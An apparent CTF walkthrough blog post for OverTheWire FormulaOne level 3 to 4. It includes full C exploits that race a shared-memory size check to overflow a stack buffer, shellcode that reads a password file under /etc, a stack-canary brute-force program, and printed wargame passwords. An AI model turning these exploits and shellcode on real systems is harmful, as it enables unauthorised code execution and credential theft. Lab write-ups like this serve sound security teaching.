---
date: 2023-12-18 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire FormulaOne Level 3 to 4 tutorial!!"
permalink: /posts/overTheWire-FormulaOne-Level-3-to-4/
tags: [overthewire, formulaone, walkthrough, ctf, binary, exploitation, buffer-overflow, stack-canary]
description: "A step by step tutorial for OverTheWire FormulaOne Level 3 → 4!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .f1-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .f1-nav .nav-left,.f1-nav .nav-center,.f1-nav .nav-right{flex:1}
  .f1-nav .nav-left{text-align:left}
  .f1-nav .nav-center{text-align:center}
  .f1-nav .nav-right{text-align:right}
  .f1-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .f1-nav a:hover{transform:translateY(-1px)}
  .f1-nav .disabled{opacity:.55}
  :root[data-theme='light'] .f1-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="f1-nav" aria-label="FormulaOne level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-2-to-3/' | relative_url }}">← Previous: Level 2 → 3</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/formulaone/formulaone4.html" target="_blank" rel="noopener">
      Official (Level 4) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-FormulaOne-Level-4-to-5/' | relative_url }}">
      Next: Level 4 → 5 →
    </a>
  </div>
</nav>

---

## Login

We’ll start from the creds we got in the previous post.

```bash
ssh formulaone2@formulaone.labs.overthewire.org -p 2232
# password (at the time): OvQAKUM3BrvbH4pKjBJBCOUpTGSDjNum
````

List the game directory:

```bash
cd /formulaone/ && ls -la
```


You’ll see both `formulaone3` and its source `formulaone3.c` (plus a `formulaone3-hard` binary).

---

## Normal path: exploit `formulaone3` (buffer overflow via shared memory)

### Source review

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <linux/shm.h>
#include <time.h>

unsigned int keys[] = {0xADCADC00, 0xADC00ADC, 0x00ADCADC, 0x0ADCADC0};
unsigned int SHMKEY;

struct msg {
  int sz;
  char ptr[1024]; // 1KB
} msg;

struct msg *echo;

void doecho(){
  int shmid;
  char buf[256];   // <-- smaller buffer

  shmid = shmget(SHMKEY, 8192, IPC_CREAT | 0777);
  echo = shmat(shmid, NULL, SHM_EXEC);

  if (echo->sz) {
    if (echo->sz < sizeof(buf)) {
      printf("The msg is...\n");
      memcpy(buf, echo->ptr, echo->sz); // memcpy to 256B stack buffer
      printf("%s\n", buf);
    }
  }
}

int main(int argc, char *argv[]){
  if(!argv[1]) return 0;
  SHMKEY = keys[argv[1][0] & 3]; // choose one of 4 keys
  doecho();
}
```

Key observations:

* Two buffers of different sizes: shared `ptr[1024]` vs local `buf[256]`.
* Uses `memcpy` (unsafe) into the 256B stack buffer.
* A size gate `if (echo->sz < sizeof(buf))` blocks direct large copies — but we can **race** it:

  1. Set `sz = 255` so the copy happens.
  2. Very briefly later, flip `sz` to a value > 256 so the copy overflows.

### Quick PoC (prove we can crash)

Run the following helper to toggle `sz` and fill shared memory:

```c
// poc_toggle.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>

#define SHM_SIZE 8192
unsigned int keys[] = {0xADCADC00,0xADC00ADC,0x00ADCADC,0x0ADCADC0};

struct msg { int sz; char ptr[1024]; };

int main(int argc, char *argv[]){
    unsigned int SHMKEY = keys[argv[1][0]&3];
    int shmid = shmget(SHMKEY, SHM_SIZE, IPC_CREAT | 0777);
    struct msg *m = shmat(shmid, NULL, 0);

    while (1) {
        m->sz = 255; memset(m->ptr,'A',255); m->ptr[255]='\0';
        usleep(500);
        m->sz = 510; memset(m->ptr,'B',510); m->ptr[510]='\0';
        usleep(500);
    }
}
```

Compile it, run in the background, then in another shell:

```bash
./poc_toggle a &
/formulaone/formulaone3 a
```

You should see a segfault soon — overflow confirmed.


### Protections (`checksec`)

```text
checksec --file=/formulaone/formulaone3
RELRO         Partial RELRO
STACK CANARY  No canary found
NX            NX enabled      # stack non-exec → place shellcode in SHM
PIE           No PIE
```

Because NX is on, we’ll place shellcode in **shared memory** and redirect the return address to jump there.

### Shellcode

We’ll cat the password file of the next user:

```text
# generated (pwntools) to: cat /etc/formulaone_pass/formulaone3
\x6a\x01\xfe\x0c\x24\x68\x6f\x6e\x65\x33\x68\x6d\x75\x6c\x61\x68\x2f\x66\x6f
\x72\x68\x70\x61\x73\x73\x68\x6f\x6e\x65\x5f\x68\x6d\x75\x6c\x61\x68\x2f\x66
\x6f\x72\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b
\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80
```

### Final exploit (normal)

```c
// exploit_normal.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>

#define SHM_SIZE 8192
unsigned int keys[] = {0xADCADC00,0xADC00ADC,0x00ADCADC,0x0ADCADC0};
struct msg { int sz; char ptr[1024]; };

const char shellcode[] =
"\x6a\x01\xfe\x0c\x24\x68\x6f\x6e\x65\x33\x68\x6d\x75\x6c\x61"
"\x68\x2f\x66\x6f\x72\x68\x70\x61\x73\x73\x68\x6f\x6e\x65\x5f"
"\x68\x6d\x75\x6c\x61\x68\x2f\x66\x6f\x72\x68\x2f\x65\x74\x63"
"\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31"
"\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80";

int main(int argc,char**argv){
  if(!argv[1]) return 0;
  unsigned int SHMKEY = keys[argv[1][0]&3];
  int shmid = shmget(SHMKEY, SHM_SIZE, IPC_CREAT | 0777);
  struct msg *m = shmat(shmid, NULL, 0);

  int vuln_buf = 256;                 // size of local buf
  int nop_len  = vuln_buf - sizeof(shellcode);
  memset(m->ptr, 0x90, 1024);         // NOP sled
  memcpy(m->ptr + nop_len, shellcode, sizeof(shellcode));

  // overwrite saved RET at offset 272 to jump inside SHM (into NOP sled)
  *(int*)(m->ptr + 272) = (int)(m->ptr + 100);

  while (1) {
    m->sz = 255;  usleep(100);
    m->sz = 280;  usleep(100);
  }
}
```

Run the helper in background, then spam the binary:

```bash
./exploit_normal a &
/formulaone/formulaone3 a
# …repeat a few times until it hits
```

If the race + overflow lands, you’ll see the password printed.

**Password obtained (at the time):**

```
Liqb5fEvP7IjKWZpoFOdYfQT494msxyv
```

---

## Hard variant: `formulaone3-hard` (stack canary)

Running the same idea against `formulaone3-hard` yields:

```
*** stack smashing detected ***: terminated
```

### `checksec`

```text
checksec --file=/formulaone/formulaone3-hard
RELRO         Partial RELRO
STACK CANARY  Canary found
NX            NX enabled
PIE           No PIE
```

So the difference is a **stack canary** (random canary; first byte null on 32-bit). Without a canary leak, we’re left with **brute force**.

### How long will brute force take?

* Attempts per second: \~1,200 (≈ 4.32M/hour)
* Race-condition success (seeing “stack smashing detected”): \~**2.5%** after tuning
* Entropy: \~3 bytes (first canary byte is `\x00`) → 16,777,216 possibilities
* Average guesses needed: \~8.39M
* Average time: `8,388,608 / (4,320,000 * 0.025) ≈ 78 hours`

You can improve the hit-rate using a busy loop to flip `sz` in a separate process (\~12% in tests), but it slows attempts/sec a lot (\~200/sec). The tuned sweet spot above is a decent trade-off.

### Brute force script (adaptive race delay + output capture)

> Note: this expects the vulnerable binary to print `stack smashing detected` when the race hits; it also scans output for a 32-char alphanumeric password.

```c
// exploit_hard_bruteforce.c  (trimmed comments for brevity)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <signal.h>
#define SHM_SIZE 8192
#define BUFFER_SIZE 256
#define PAYLOAD_SIZE 280
#define NOP 0x90
#define CANARY_OFFSET BUFFER_SIZE
#define RET_OFFSET 272
unsigned int keys[] = {0xADCADC00,0xADC00ADC,0x00ADCADC,0x0ADCADC0};
struct msg{ int sz; char ptr[1024]; };

const char shellcode[] =
"\x6a\x01\xfe\x0c\x24\x68\x6f\x6e\x65\x33"
"\x68\x6d\x75\x6c\x61\x68\x2f\x66\x6f\x72"
"\x68\x70\x61\x73\x73\x68\x6f\x6e\x65\x5f"
"\x68\x6d\x75\x6c\x61\x68\x2f\x66\x6f\x72"
"\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x6a"
"\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31"
"\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0"
"\xbb\xcd\x80";

pid_t spawn_vuln(char *arg, int *pipe_fd){
  int p[2]; pipe(p);
  pid_t pid=fork();
  if(pid==0){
    close(p[0]);
    dup2(p[1],1); dup2(p[1],2); close(p[1]);
    execl("/formulaone/formulaone3-hard","formulaone3-hard",arg,NULL);
    _exit(1);
  }
  close(p[1]); *pipe_fd=p[0]; return pid;
}

int detect_pass(const char *s){
  size_t n=strlen(s);
  for(size_t i=0;i+32<=n;i++){
    int ok=1; for(int j=0;j<32;j++) if(!isalnum((unsigned char)s[i+j])){ok=0;break;}
    if(ok){ printf("Detected password: %.*s\n",32,s+i); return 1; }
  }
  return 0;
}

int main(int argc,char**argv){
  if(argc<2){ fprintf(stderr,"usage: %s <keychar> [race_us]\n",argv[0]); return 1; }
  unsigned int race_us = (argc>=3)?atoi(argv[2]):400;
  unsigned int SHMKEY=keys[argv[1][0]&3];
  int shmid=shmget(SHMKEY,SHM_SIZE,IPC_CREAT|0777);
  struct msg*m=shmat(shmid,NULL,0);

  unsigned long attempts=0, hits=0;
  while(1){
    // guess 3 bytes (top byte stays 0x00)
    unsigned int canary=(rand()%0x1000000)<<8;

    memset(m->ptr,NOP,PAYLOAD_SIZE);
    int sc_off=PAYLOAD_SIZE-sizeof(shellcode);
    memcpy(m->ptr+sc_off,shellcode,sizeof(shellcode));
    *(unsigned int*)(m->ptr+CANARY_OFFSET)=canary;
    *(unsigned int*)(m->ptr+RET_OFFSET)=(unsigned int)(m->ptr+100);

    int rfd; pid_t cpid=spawn_vuln(argv[1],&rfd);
    m->sz=255; usleep(race_us); m->sz=PAYLOAD_SIZE;

    struct timeval tv={0,200000};
    fd_set rf; FD_ZERO(&rf); FD_SET(rfd,&rf);
    int sel=select(rfd+1,&rf,NULL,NULL,&tv);
    if(sel>0 && FD_ISSET(rfd,&rf)){
      char buf[2048]; int n=read(rfd,buf,sizeof(buf)-1); if(n>0){
        buf[n]='\0';
        if(strstr(buf,"stack smashing detected")) hits++;
        if(detect_pass(buf)){ kill(cpid,SIGKILL); waitpid(cpid,NULL,0); break; }
      }
    }
    kill(cpid,SIGKILL); waitpid(cpid,NULL,0); close(rfd);

    attempts++;
    if(attempts%1000==0){
      fprintf(stderr,"Attempt %lu — canary 0x%08x — success(race) ~ %.2f%% — race_us=%u\n",
              attempts, canary, (hits*100.0)/1000.0, race_us);
      hits=0;
      // tiny auto-tune
      race_us += (attempts/1000)%2 ? 10 : (unsigned)-10;
      if(race_us<1) race_us=1;
    }
  }
  return 0;
}
```

When it finally lands, the binary prints the next password (for the next user).


---

## Conclusion

* **Normal path (3)**: shared-memory race → overflow 256B stack buffer → jump into shellcode in SHM → dump password.
* **Hard path (3-hard)**: adds **stack canary** → without a leak, practical option is **brute-force** (3-byte entropy on 32-bit), which is slow but feasible with tuning.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

